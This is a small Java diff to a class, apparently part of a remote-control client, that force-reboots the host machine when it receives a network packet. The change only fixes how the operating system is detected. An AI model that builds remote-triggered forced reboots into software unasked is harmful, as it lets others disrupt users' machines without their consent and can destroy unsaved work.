@@ -10,7 +10,7 @@ public class Packet29RestartComputer extends AbstractIncomingPacket {
 	@Override
 	public void read() throws Exception {
 		try {
-			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				Runtime.getRuntime().exec("shutdown.exe -t 0 -r -f");
 			} else {
 				Runtime.getRuntime().exec("reboot");
